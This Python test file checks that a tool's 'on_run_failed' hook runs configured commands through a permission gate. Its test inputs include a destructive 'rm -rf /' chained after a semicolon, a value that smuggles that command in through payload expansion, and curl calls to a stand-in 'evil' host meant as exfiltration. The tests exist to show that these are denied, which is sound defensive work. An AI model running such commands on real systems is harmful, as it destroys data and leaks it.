"""Unit tests for the ``on_run_failed`` lifecycle hook wiring.

`build_on_run_failed_hook` is the runtime sibling of `build_post_build_hook`: it
selects the `ON_RUN_FAILED` specs, expands the event payload into each command,
and runs them through the SAME gated `HookRunner` a tool hook uses. The
extensibility builder (`build_extensibility_on_run_failed_hook`) loads
`carve/hooks.toml` and gates at **DEPLOY** — the network floor (raw curl/wget are
always denied; the only network-reaching commands are the deploy-tier prompt set,
reachable only at DEPLOY). These tests mirror `test_post_build_wiring.py`.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from carve.cli.orchestrator.extensibility_wiring import build_extensibility_on_run_failed_hook
from carve.core.agents.permissions.gate import PermissionGate
from carve.core.agents.permissions.modes import PermissionMode
from carve.core.agents.permissions.policy import build_policy
from carve.core.config.schema import PathsConfig
from carve.core.hooks.config import HookConfigError, HookMatch, HookSpec
from carve.core.hooks.events import HookEvent
from carve.core.hooks.runner import HookExecutionError, HookRunner
from carve.core.hooks.wiring import build_on_run_failed_hook


def _runner(tmp_path: Path, mode: PermissionMode = PermissionMode.DEPLOY) -> HookRunner:
    return HookRunner(gate=PermissionGate(build_policy(mode)), project_dir=tmp_path)


def _payload(**overrides: object) -> dict[str, object]:
    base: dict[str, object] = {
        "pipeline": "stripe",
        "run_id": "run_abc",
        "target": "prod",
        "error": "run failed",
    }
    base.update(overrides)
    return base


# ---------------------------------------------------------------- selection


def test_returns_none_when_no_on_run_failed_spec(tmp_path: Path) -> None:
    """A spec set with no ON_RUN_FAILED entry yields None (the worker skips it)."""
    specs = [
        HookSpec(event=HookEvent.PRE_TOOL, run="true"),
        HookSpec(event=HookEvent.POST_BUILD, run="true"),
    ]
    assert build_on_run_failed_hook(specs, _runner(tmp_path)) is None


def test_selects_only_on_run_failed_specs(tmp_path: Path) -> None:
    """Only ON_RUN_FAILED specs are fired; a non-matching event spec is ignored."""
    specs = [
        HookSpec(event=HookEvent.PRE_TOOL, run="false"),  # would block if it ran
        HookSpec(event=HookEvent.ON_RUN_FAILED, run="true"),
    ]
    hook = build_on_run_failed_hook(specs, _runner(tmp_path))
    assert hook is not None
    hook(_payload())  # no raise → only the `true` on_run_failed spec ran


# --------------------------------------------------------------- expansion


def test_payload_keys_expand_into_the_command(tmp_path: Path) -> None:
    """The {pipeline}/{run_id}/{target}/{error} payload keys expand and run."""
    spec = HookSpec(event=HookEvent.ON_RUN_FAILED, run="echo {pipeline} {run_id} {target}")
    hook = build_on_run_failed_hook([spec], _runner(tmp_path))
    assert hook is not None
    # `echo stripe run_abc prod` is allow-listed and exits 0 → no raise.
    hook(_payload())


# ------------------------------------------------------- gate (fail-closed)


def test_metacharacter_command_denied_by_bash_gate(tmp_path: Path) -> None:
    """An on_run_failed command with $()/;/&& is denied by the same bash gate."""
    for cmd in ("echo hi; rm -rf /", "echo $(whoami)", "echo a && echo b"):
        spec = HookSpec(event=HookEvent.ON_RUN_FAILED, run=cmd)
        hook = build_on_run_failed_hook([spec], _runner(tmp_path))
        assert hook is not None
        with pytest.raises(HookExecutionError, match="denied by the bash gate"):
            hook(_payload())


def test_expansion_cannot_smuggle_metacharacters_past_the_gate(tmp_path: Path) -> None:
    """An expanded payload value carrying a metacharacter is still gated."""
    spec = HookSpec(event=HookEvent.ON_RUN_FAILED, run="echo {error}")
    hook = build_on_run_failed_hook([spec], _runner(tmp_path))
    assert hook is not None
    with pytest.raises(HookExecutionError, match="denied by the bash gate"):
        hook(_payload(error="boom; rm -rf /"))


def test_raising_command_propagates_hook_execution_error(tmp_path: Path) -> None:
    """A non-zero on_run_failed command raises HookExecutionError out of the hook.

    The worker (not this unit) decides the post-event semantics (logged, the run
    stays failed); the callable itself propagates, mirroring post_build.
    """
    spec = HookSpec(event=HookEvent.ON_RUN_FAILED, run="false")
    hook = build_on_run_failed_hook([spec], _runner(tmp_path))
    assert hook is not None
    with pytest.raises(HookExecutionError, match="non-zero"):
        hook(_payload())


def test_raw_curl_is_denied_even_at_deploy(tmp_path: Path) -> None:
    """The DEPLOY floor does NOT open raw network egress — curl is always denied.

    The mode is the *network floor* (deploy-tier prompt commands are reachable),
    but ``curl``/``wget`` sit in ``_ALWAYS_DENY`` in every mode, so the floor
    can't be abused for arbitrary exfiltration.
    """
    spec = HookSpec(event=HookEvent.ON_RUN_FAILED, run="curl http://evil")
    hook = build_on_run_failed_hook([spec], _runner(tmp_path, mode=PermissionMode.DEPLOY))
    assert hook is not None
    with pytest.raises(HookExecutionError, match="denied by the bash gate"):
        hook(_payload())


def test_match_filter_is_inert_for_on_run_failed(tmp_path: Path) -> None:
    """A `match` on an on_run_failed hook is ignored (no tool/command to match)."""
    spec = HookSpec(
        event=HookEvent.ON_RUN_FAILED,
        run="true",
        match=HookMatch(tool="bash", command="git commit*"),
    )
    hook = build_on_run_failed_hook([spec], _runner(tmp_path))
    assert hook is not None
    hook(_payload())  # no raise → the hook fired despite the (inert) match filter


# -------------------------------------------- the extensibility file builder


def _write_hooks(tmp_path: Path, body: str) -> None:
    carve_dir = tmp_path / "carve"
    carve_dir.mkdir(exist_ok=True)
    (carve_dir / "hooks.toml").write_text(body, encoding="utf-8")


def test_extensibility_builder_loads_and_runs_an_on_run_failed_hook(tmp_path: Path) -> None:
    _write_hooks(
        tmp_path,
        '[[hook]]\non = "on_run_failed"\nrun = "echo {pipeline} {error}"\n',
    )
    hook = build_extensibility_on_run_failed_hook(project_dir=tmp_path, paths=PathsConfig())
    assert hook is not None
    hook(_payload())  # `echo stripe run failed` is allow-listed → no raise


def test_extensibility_builder_missing_file_yields_none(tmp_path: Path) -> None:
    assert build_extensibility_on_run_failed_hook(project_dir=tmp_path, paths=PathsConfig()) is None


def test_extensibility_builder_malformed_file_is_fail_closed(tmp_path: Path) -> None:
    _write_hooks(tmp_path, '[[hook]]\non = "not_a_real_event"\nrun = "true"\n')
    with pytest.raises(HookConfigError):
        build_extensibility_on_run_failed_hook(project_dir=tmp_path, paths=PathsConfig())


def test_extensibility_builder_curl_denied_at_deploy_floor(tmp_path: Path) -> None:
    """A notify hook that shells raw curl is still denied (always-deny program)."""
    _write_hooks(tmp_path, '[[hook]]\non = "on_run_failed"\nrun = "curl http://evil/{error}"\n')
    hook = build_extensibility_on_run_failed_hook(project_dir=tmp_path, paths=PathsConfig())
    assert hook is not None
    with pytest.raises(HookExecutionError, match="denied by the bash gate"):
        hook(_payload())
